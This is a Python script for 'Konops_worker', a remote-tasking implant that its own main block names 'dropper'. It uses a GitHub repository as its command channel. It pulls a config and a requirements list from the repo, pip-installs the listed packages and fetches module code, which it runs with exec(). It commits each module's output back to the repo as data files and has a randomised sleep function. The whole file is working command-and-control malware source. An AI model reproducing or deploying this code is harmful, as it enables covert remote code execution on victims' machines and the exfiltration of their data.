#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
@author: XCS, L0WK3Y
"""
import gitwrapper
import json
import sys
import datetime
import time
import types
import random
import subprocess

#configuration path
cpath="config/"
#module path
mpath="modules/"
#data path
dpath="data/"

class Konops_worker():
    def __init__(self, konops_id):
        #Konops id
        self.konops_id = konops_id
        #Konops modules
        self.konops_modules = []
        #Konops required libraries
        self.konops_requirements = []
        #Is it configured?
        self.configured = False
        #Configuration file 
        self.konops_config = "%s.json"%self.konops_id
        
        #Initialize tokens and headers
        
        self.token, self.headers = gitwrapper.login()
        

    def configure(self):
        #Loads the configuration file. Returns its content.
        config_file_path = cpath + self.konops_config
        
        response , config_content_json = gitwrapper.get_file_contents(self.token, self.headers, config_file_path)

        self.configured = True

        config_file_content = json.loads(config_content_json)
        for task in config_file_content:
            #print(task['module'])
            self.konops_modules.append(task['module'])
        return config_file_content

    def get_requirements(self):

        requirement_file_path = cpath + self.konops_id + "_requirements.json"
        response , requirement_content_json = gitwrapper.get_file_contents(self.token, self.headers, requirement_file_path)
        requirement_file_content = json.loads(requirement_content_json)

        for library in requirement_file_content:
            self.konops_requirements.append(library['library'])

    def install_requirements(self):
        self.get_requirements()
        for library in range(len(self.konops_requirements)):
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', self.konops_requirements[library]])

    def sleep(self):
        sleep_time = random.randint(120, 1000)
        time.sleep(sleep_time)
    
    def execute(self):
        #Executes the loaded modules.

        module_data = dict()

        for task in range(len(self.konops_modules)):

            module_filename  = self.konops_modules[task]+".py"
            module_path = mpath + module_filename
            module_name = module_filename.strip(".py")

            #Get module file content
            response , content = gitwrapper.get_file_contents(self.token, self.headers, module_path)
            #print(resp)
            module = types.ModuleType(module_name)
            exec(content, module.__dict__)
            sys.modules[module_name] = module

            execution_result = sys.modules[module_name].run()
            module_data[module_name] = str(execution_result)
            print("result of " + module_filename + " is: '" + str(execution_result) + "'")

        time = str(datetime.datetime.now())
        data_filename = dpath + self.konops_id + time + ".txt"
    
        commit_message = "Stored " + self.konops_id + " data."
        
        content = json.dumps(module_data)
        #Store the data to a file in github
        gitwrapper.store_to_file(self.token, self.headers, data_filename, commit_message, content)
        #print(resp2) #always print responses to identify the bugs during debugging.They print errors.

    def run_worker(self):
        self.install_requirements()
        self.configure()
        self.execute()

if __name__ == '__main__':
    dropper = Konops_worker("obsv")
    dropper.run_worker()